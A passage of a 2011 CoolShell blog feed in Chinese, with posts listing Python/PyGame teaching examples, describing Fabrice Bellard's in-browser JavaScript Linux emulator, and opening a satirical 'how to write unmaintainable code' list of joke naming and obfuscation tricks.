<meta itemprop="ratingCount" content="24">
</div>
</div>
<div id="post-ratings-4671-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-05-04T14:26:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/4671.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Python 和 PyGame 的一些示例 ]]></title>
<link>https://coolshell.cn/articles/4710.html</link>
<content><![CDATA[ 
<p>看到<a href="http://cs.simpson.edu/?q=python_pygame_examples" target="_blank">一个网页</a>收集了很多使用Python和PyGame写游戏的示例，分享给大家。（注：我不知道用Python/PyGame写游戏其性能会怎么样，但是一些小游戏应该是没有问题的）</p>
<p>这个网页同时给了一本<a href="http://cs.simpson.edu/files/CS_Intro_Book.pdf" target="_blank">介绍Python和PyGame的电子书</a>（PDF），下面的这些例子就是这本书的示例。所有的这些示例可以<a href="http://cs.simpson.edu/files/Python%20Examples.zip" target="_blank">打包下载</a>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%9F%BA%E7%A1%80_Python_%E7%A4%BA%E4%BE%8B" title="基础 Python 示例">基础 Python 示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Pygame_%E5%9B%BE%E5%BD%A2%E7%A4%BA%E4%BE%8B" title="Pygame 图形示例">Pygame 图形示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Pygame_%E7%A4%BA%E4%BE%8B" title="Pygame 示例">Pygame 示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%B8%B8%E6%88%8F%E7%A4%BA%E4%BE%8B" title="游戏示例">游戏示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%AE%89%E8%A3%85%E5%8C%85" title="创建一个安装包">创建一个安装包</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%90%9C%E7%B4%A2%E5%92%8C%E6%8E%92%E5%BA%8F%E7%A4%BA%E4%BE%8B" title="搜索和排序示例">搜索和排序示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%96%87%E4%BB%B6%E7%A4%BA%E4%BE%8B" title="文件示例">文件示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B6%E5%AE%83%E4%BF%A1%E6%81%AF" title="其它信息">其它信息</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%9F%BA%E7%A1%80_Python_%E7%A4%BA%E4%BE%8B"></span>基础 Python 示例<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://cs.simpson.edu/?q=if_statement_examples.py">if_statement_examples.py</a> – if 语句的一个简单示例</li>
<li>
<a href="http://cs.simpson.edu/?q=for_loops_examples.py">for_loop_examples.py</a> – for 语句的一个简单示例.</li>
<li>
<a href="http://cs.simpson.edu/?q=while_loop_examples.py">while_loop_examples.py</a> – while 语句的一个简单示例</li>
</ul>
<h4>
<span class="ez-toc-section" id="Pygame_%E5%9B%BE%E5%BD%A2%E7%A4%BA%E4%BE%8B"></span>Pygame 图形示例<span class="ez-toc-section-end"></span>
</h4>
<table border="0" cellspacing="1" cellpadding="1">
<tbody>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=pygame_base_template.py">pygame_base_template.py</a> – 开启一个黑的 pygame 窗口。当你要写一个新的代码时，你可以使用这个示例的代码初始化你的程序。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/pygame_base_template.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=simple_graphics_demo.py">simple_graphics_demo.py</a> – 作图，画一些简单的图形。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/simple_graphics_demo.png"><img alt="image placeholder" ></a></td>
</tr>
</tbody>
</table>
<p><span id="more-4710"></span></p>
<table border="0" cellspacing="1" cellpadding="1">
<tbody>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=functions_and_graphics.py">functions_and_graphics.py</a> – 图一些雪人。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/functions_and_graphics.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=animating_snow.py">animating_snow.py</a> – 下雪动画。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/animating_snow.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=move_keyboard.py">move_keyboard.py</a> – 使用键盘移动一个图形
<p><a href="http://cs.simpson.edu/?q=move_mouse.py">move_mouse.py</a> – 使用鼠标移动一个图形</p>
<p><a href="http://cs.simpson.edu/?q=move_game_controller.py">move_game_controller.py</a> – 使用游戏手柄移动一个图形</p>
</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/move_keyboard.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=bitmapped_graphics.py">bitmapped_graphics.py</a> – 显示一些图片（png, jpb），并加入一些声音。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/bitmapped_graphics.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=array_backed_grid.py">array_backed_grid.py</a> – 一个网格，可以用来开发一些棋类的游戏。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/array_backed_grid.png"><img alt="image placeholder" ></a></td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="Pygame_%E7%A4%BA%E4%BE%8B"></span>Pygame 示例<span class="ez-toc-section-end"></span>
</h4>
<table border="0" cellspacing="1" cellpadding="1">
<tbody>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=sprite_collect_blocks.py">sprite_collect_blocks.py</a> – 使用鼠标移动一个小点</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/sprite_collect_blocks.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=sprite_collect_circle.py">sprite_collect_circle.py</a> – 和上面的示例一样，只不过是圆点。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/sprite_collect_circle.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=sprite_collect_graphic.py">sprite_collect_graphic.py</a> – 和上面的示例一样，只不过是图片。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/sprite_collect_graphic.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=move_sprite_mouse.py">move_sprite_mouse.py</a> – 用鼠标移动一个点
<p><a href="http://cs.simpson.edu/?q=move_sprite_keyboard_jump.py">move_sprite_keyboard_jump.py</a> – 用键盘移动一个点（跳动式的）</p>
<p><a href="http://cs.simpson.edu/?q=move_sprite_keyboard_smooth.py">move_sprite_keyboard_smooth.py</a> – 用键盘移动一个点（平滑式的）.</p>
<p><a href="http://cs.simpson.edu/?q=move_sprite_game_controller.py">move_sprite_game_controller.py</a> – 用游戏手柄移动一个点</p>
</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/move_sprite_mouse.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=move_with_walls_example.py">move_with_walls_example.py</a> – 移动一个点，但是会被墙阻止。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/move_with_walls_example.png"><img alt="image placeholder" ></a></td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="%E6%B8%B8%E6%88%8F%E7%A4%BA%E4%BE%8B"></span>游戏示例<span class="ez-toc-section-end"></span>
</h4>
<table border="0" cellspacing="1" cellpadding="1">
<tbody>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=bounce_ball_with_paddle.py">bounce_ball_with_paddle.py</a> – 两个玩家玩对碰球游戏，需要两个手柄。</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/bounce_ball_with_paddle.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>
<a href="http://cs.simpson.edu/?q=breakout_simple.py">breakout_simple.py</a> – 一个简单的游戏，显示 “Game Over” 信息.</td>
<td><a href="http://cs.simpson.edu/files/python_examples/screenshots/breakout_simple.png"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>一个学生的作业. <a href="http://cs.simpson.edu/?q=node/62">Spring 2011</a>
</td>
<td><a href="http://cs.simpson.edu/?q=node/62"><img alt="image placeholder" ></a></td>
</tr>
<tr>
<td>另一个学生的作业.<a href="http://cs.simpson.edu/21"> Fall 2010</a>
<p><a href="http://cs.simpson.edu/?q=node/23">Download games</a> – .</p>
</td>
<td><a href="http://cs.simpson.edu/?q=node/21"><img alt="image placeholder" ></a></td>
</tr>
</tbody>
</table>
<h4>
<span class="ez-toc-section" id="%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%AE%89%E8%A3%85%E5%8C%85"></span>创建一个安装包<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://cs.simpson.edu/?q=make_an_installer_for_your_python_program">Python Pygame 安装包教程 </a></p>
<h4>
<span class="ez-toc-section" id="%E6%90%9C%E7%B4%A2%E5%92%8C%E6%8E%92%E5%BA%8F%E7%A4%BA%E4%BE%8B"></span>搜索和排序示例<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://cs.simpson.edu/files/example_sorted_names.txt">example_sorted_names.txt</a> – Sample file of names used in searching_example.py</li>
<li>
<a href="http://cs.simpson.edu/?q=searching_example.py">searching_example.py</a> – Example linear and binary searches</li>
<li>
<a href="http://cs.simpson.edu/files/AliceInWonderLand.txt">AliceInWonderLand.txt</a> – Text of Alice In Wonderland. Source: <a href="https://www.gutenberg.org/wiki/Main_Page">Project Gutenberg</a>
</li>
<li><a href="http://cs.simpson.edu/files/AliceInWonderLand200.txt">AliceInWonderLand200.txt</a></li>
<li><a href="http://cs.simpson.edu/files/dictionary.txt">dictionary.txt</a></li>
<li>
<a href="http://cs.simpson.edu/?q=sorting_examples.py">sorting_examples.py</a> – Example code for the insertion and selection sorts.</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%96%87%E4%BB%B6%E7%A4%BA%E4%BE%8B"></span>文件示例<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://cs.simpson.edu/?q=high_score.py">high_score.py</a> – Example that shows how to read and write a high score to the disk so that it persists between program runs.</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83%E4%BF%A1%E6%81%AF"></span>其它信息<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<a href="http://www.pygame.org/">Pygame Website</a> – Pygame 主站</li>
<li>
<a href="http://www.pygame.org/docs/">Pygame Documentation</a> – Pygame 文档</li>
</ul>
<p>（全文完）</p>
<p>——————————</p>
<p><strong><span style="color: #000000;">最后，不好意思很久没有更新酷壳，这段时间在国外出差，事多，5月31回国。大家见谅！</span></strong></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4220.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4220.html" class="wp_rp_title">一些有意思的文章和资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3270.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3270.html" class="wp_rp_title">两本电子书</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1928.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1928.html" class="wp_rp_title">如何使用Python操作摄像头</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1157.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1157.html" class="wp_rp_title">Python 自然语言处理</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11265.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11265.html" class="wp_rp_title">Python修饰器的函数式编程</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4710" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="4b6af7ecf1">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>8</strong> 人打了分，平均分： <strong>3.38</strong> )<br><span class="post-ratings-text" id="ratings_4710_text"></span><meta itemprop="name" content="Python 和 PyGame 的一些示例">
<meta itemprop="headline" content="Python 和 PyGame 的一些示例">
<meta itemprop="description" content="看到一个网页收集了很多使用Python和PyGame写游戏的示例，分享给大家。（注：我不知道用Python/PyGame写游戏其性能会怎么样，但是一些小游戏应该是没有问题的）

这个网页同时给了一本介绍Python和PyGame的电子书（PDF），下面的这些例子就是这本书的示例。所有的这些示例可以打包下载。
基础 Python 示例

	if_statement_examples.py ...">
<meta itemprop="datePublished" content="2011-05-18T08:43:58+08:00">
<meta itemprop="dateModified" content="2011-05-18T03:14:16+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4710.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4710.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.38">
<meta itemprop="ratingCount" content="8">
</div>
</div>
<div id="post-ratings-4710-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-05-18T08:43:58+08:00</pubDate>
<guid>https://coolshell.cn/articles/4710.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 在Web上运行Linux ]]></title>
<link>https://coolshell.cn/articles/4722.html</link>
<content><![CDATA[ 
<p>一个叫Fabrice Bellard的程序员写了一段Javascript在Web浏览器中启动Linux（<a href="http://bellard.org/jslinux/" target="_blank">原网页</a>，我把这个网页iframe在了下面），目前，你只能使用Firefox 4和Chrome 11运行这个Linux。这不是什么假的模仿Linux的东西，这是实实在在的运行一个Linux。这一举动还引起了很多很牛人的关注，包括Javascript的创建者<a href="https://twitter.com/#!/BrendanEich/status/70393502328045568" target="_blank">Brendan Eich</a>。</p>
<p align="center"><button id="jslinux-stop" style="display: none" onclick="document.getElementById('jslinux').src='about:blank';document.getElementById('jslinux-stop').style.display='none';document.getElementById('jslinux-start').style.display='block';">清除启动</button><button id="jslinux-start" onclick="document.getElementById('jslinux').src='http://bellard.org/jslinux/';document.getElementById('jslinux-start').style.display='none';document.getElementById('jslinux-stop').style.display='block';">开始启动</button></p>
<p align="center"><iframe loading="lazy" id="jslinux" frameborder="0" style="background:#000;border:0" width="700" height="540" src=""></iframe></p>
<p><span id="more-4722"></span></p>
<p>随后，Fabrice Bellard发布了相关的技术说明：<a href="http://bellard.org/jslinux/tech.html" target="_blank">http://bellard.org/jslinux/tech.html</a>，从这份文档中我们可以看到：</p>
<ul>
<li>这个模似器完全由Javascript写成</li>
<li>CPU仿真器使用的是<a href="https://qemu.org/">QEMU</a>（接近于原古的486），为了装上Linux，其做了一些改动。</li>
<li>Javascript的终端本来可以使用<a href="http://www.masswerk.at/termlib/">termlib</a>，但他还是自己写了一个，因为OS的按键和Web浏览器不一样（<a href="http://unixpapa.com/js/key.html">here</a>）</li>
<li>Linux  使用了2.6.20内核，编译配置在<a href="http://bellard.org/jslinux/config_linux-2.6.20" target="_blank">这里</a>，并做了一些<a href="http://bellard.org/jslinux/patch_linux-2.6.20" target="_blank">小改动</a>。</li>
<li>磁盘用的是Ram Disk，在启动的时候装载。其文件系统由<a href="https://buildroot.uclibc.org/">Buildroot</a> 和<a href="https://www.busybox.net/">BusyBox</a>产生。</li>
<li>在Home目录下有一个hello.c的程序，你可以使用<a href="http://bellard.org/tcc">TinyCC</a>编译（tcc，参看酷壳的<a title="用TCC可以干些什么？" href="https://coolshell.cn/articles/786.html" target="_blank">这篇文章</a>）</li>
</ul>
<p>从这个事我有这些感触，</p>
<ol>
<li>在Web上运行一个Linux的操作系统不是问题。那么在Web上还有什么不能做的吗？</li>
<li>Linux真是性能很高，在Javascript下运行感觉也不慢啊。</li>
<li>真是Techno-Geek。</li>
</ol>
<p> </p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 – Shell 篇</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17524.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17524.html" class="wp_rp_title">如何读懂并写出装逼的函数式代码</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4722" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="b60cab5338">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>52</strong> 人打了分，平均分： <strong>4.69</strong> )<br><span class="post-ratings-text" id="ratings_4722_text"></span><meta itemprop="name" content="在Web上运行Linux">
<meta itemprop="headline" content="在Web上运行Linux">
<meta itemprop="description" content="一个叫Fabrice Bellard的程序员写了一段Javascript在Web浏览器中启动Linux（原网页，我把这个网页iframe在了下面），目前，你只能使用Firefox 4和Chrome 11运行这个Linux。这不是什么假的模仿Linux的东西，这是实实在在的运行一个Linux。这一举动还引起了很多很牛人的关注，包括Javascript的创建者Brendan Eich。

清除启动...">
<meta itemprop="datePublished" content="2011-05-19T08:35:08+08:00">
<meta itemprop="dateModified" content="2011-05-24T00:03:35+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4722.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4722.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.69">
<meta itemprop="ratingCount" content="52">
</div>
</div>
<div id="post-ratings-4722-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-05-19T08:35:08+08:00</pubDate>
<guid>https://coolshell.cn/articles/4722.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何写出无法维护的代码 ]]></title>
<link>https://coolshell.cn/articles/4758.html</link>
<content><![CDATA[ 
<p>酷壳里有很多我觉得很不错的文章，但是访问量最大的却是那篇《<a title="6个变态的C语言Hello World程序" href="https://coolshell.cn/articles/914.html" target="_blank">6个变态的Hello World</a>》，和它能在本站右边栏“<strong>全站热门</strong>”中出现的还有“<a title="如何加密/混乱C源代码" href="https://coolshell.cn/articles/933.html" target="_blank">如何加密源代码</a>”，以及<a title="编程真难啊" href="https://coolshell.cn/articles/1391.html" target="_blank">编程真难啊</a>等这样的文章。可见本站的读者们的偏好，我也相信你们都是“身怀绝技”的程序员。所以，今天给大家推荐这篇文章，相信一定能触动大家的兴奋点。</p>
<p>这篇文章的原文在这里（<a href="http://mindprod.com/jgloss/unmain.html" target="_blank">http://mindprod.com/jgloss/unmain.html</a>），我看完后我想说——</p>
<ol>
<li><strong>什么叫“创造力”，创造力就是——就算是要干一件烂事都能干得那么漂亮那么有创意的能力。</strong></li>
<li>
<strong>什么叫“抓狂”，抓狂就是——以一种沉着老练的不屈不挠的一本正经的精神一点一点把你推向崩溃的边缘</strong>。</li>
</ol>
<p>我把文章节选了一些，也并没有完全翻译，简译一下，也加入了一些自己的调侃。对于有下面这些编程习惯的朋友，请大家对号入座。另外，维护程序的朋友们，你们死定了！！</p>
<blockquote>
<p><img alt="image placeholder" >If builders built buildings the way programmers write programs, then the first woodpecker that came along would destroy civilization. （如果建筑师盖房子就像程序员写程序一样，那么，第一只到来的啄木鸟就能毁掉我们的文明）</p>
<p>~ Gerald Weinberg (born: 1933-10-27 age: 77) <a href="http://www.geraldmweinberg.com/Site/Home.html">Weinberg’s Second Law</a></p>
</blockquote>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%A8%8B%E5%BA%8F%E5%91%BD%E5%90%8D" title="程序命名">程序命名</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BC%AA%E8%A3%85%E6%AC%BA%E8%AF%88" title="伪装欺诈">伪装欺诈</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%96%87%E6%A1%A3%E5%92%8C%E6%B3%A8%E9%87%8A" title="文档和注释">文档和注释</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" title="程序设计">程序设计</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%B7%B7%E4%B9%B1%E4%BD%A0%E7%9A%84%E4%BB%A3%E7%A0%81" title="混乱你的代码">混乱你的代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%B5%8B%E8%AF%95" title="测试">测试</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Write_Everywhere_Read_Nowhere" title="Write Everywhere, Read Nowhere">Write Everywhere, Read Nowhere</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%A8%8B%E5%BA%8F%E5%91%BD%E5%90%8D"></span>程序命名<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>容易输入的名字</strong>。比如：Fred，asdf</li>
<li>
<strong>单字母的变量名</strong>。比如：a,b,c, x,y,z（陈皓注：如果不够用，可以考虑a1,a2,a3,a4,….）</li>
<li>
<strong>有创意地拼写错误</strong>。比如：SetPintleOpening， SetPintalClosing。这样可以让人很难搜索代码。</li>
<li>
<strong>抽象</strong>。比如：ProcessData, DoIt, GetData… 抽象到就跟什么都没说一样。</li>
<li>
<strong>缩写</strong>。比如：WTF，RTFSC …… （陈皓注：使用拼音缩写也同样给力，比如： BT，TMD，TJJTDS）</li>
<li>
<strong>随机大写字母</strong>。比如：gEtnuMbER..</li>
<li>
<strong>重用命名</strong>。在内嵌的语句块中使用相同的变量名有奇效。</li>
<li>
<strong>使用重音字母</strong>。比如：int  ínt（注：第二个 ínt不是int）</li>
<li>
<strong>使用下划线</strong>。比如：_, __, ___。</li>
<li>
<strong>使用不同的语言</strong>。比如混用英语，德语，或是中文拼音。</li>
<li>
<strong>使用字符命名</strong>。比如：slash, asterix, comma…</li>
<li>
<strong>使用无关的单词</strong>。比如：god, superman, iloveu….</li>
<li>
<strong>混淆l和1</strong>。字母l和数字1有时候是看不出来的。</li>
</ul>
<h4>
<span id="more-4758"></span>伪装欺诈</h4>
<ul>
<li>
<strong>把注释和代码交织在一起</strong>。</li>
</ul>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">for(j=0; j&lt;array_len; j+ =8)
{
    total += array[j+0 ];
    total += array[j+1 ];
    total += array[j+2 ]; /* Main body of
    total += array[j+3]; * loop is unrolled
    total += array[j+4]; * for greater speed.
    total += array[j+5]; */
    total += array[j+6 ];
    total += array[j+7 ];
}</pre>
<ul>
<li>
<strong>隐藏宏定义</strong>。如：#define a=b a=0-b，当人们看到a=b时，谁也想不到那是一个宏。</li>
</ul>
<ul>
<li>
<strong>换行</strong>。如下所示，下面的示例使用搜索xy_z变得困难。</li>
</ul>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define local_var xy\
_z // local_var OK</pre>
<ul>
<li>
<strong>代码和显示不一致</strong>。比如，你的界面显示叫postal code，但是代码里确叫 zipcode.</li>
</ul>
<ul>
<li>
<strong>隐藏全局变量</strong>。把使用全局变量以函数参数的方式传递给函数，这样可以让人觉得那个变量不是全局变量。</li>
</ul>
<ul>
<li>
<strong>使用同意词</strong>。如：</li>
</ul>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define xxx global_var // in file std.h&amp;nbsp;
#define xy_z xxx // in file ..\other\substd.h&amp;nbsp;
#define local_var xy_z // in file ..\codestd\inst.h</pre>
<ul>
<li>
<strong>使用相似的变量名</strong>。如：单词相似，swimmer 和 swimner，字母相似：ilI1| 或 oO08。parselnt 和 parseInt， D0Calc 和 DOCalc。还有这一组：xy_Z, xy__z, _xy_z, _xyz, XY_Z, xY_z, Xy_z。</li>
</ul>
<ul>
<li>
<strong>重载函数</strong>。使用相同的函数名，但是其功能和具体实现完全没有关系。</li>
</ul>
<ul>
<li>
<strong>操作符重载</strong>。重载操作符可以让你的代码变得诡异，感谢CCTV，感谢C++。这个东西是可以把混乱代码提高到一种艺术的形式。比如：重载一个类的 ! 操作符，但实际功能并不是取反，让其返回一个整数。于是，如果你使用 ! ! 操作符，那么，有意思的事就发生了—— 先是调用类的重载 ! 操作符，然后把其返回的整数给 ! 成了 布尔变量，如果是 !!! 呢？呵呵。</li>
</ul>
<ul>
<li>
<strong>#define</strong>。看过本站那些混乱代码的文章，你都会知道宏定义和预编译对于写出不可读的代码的重大意义。不过，一个具有想像力的东西是——在头文件中使用预编译来查看这个头文件被include了几次，而被include不同的次数时，其中的函数定义完全不一样。</li>
</ul>
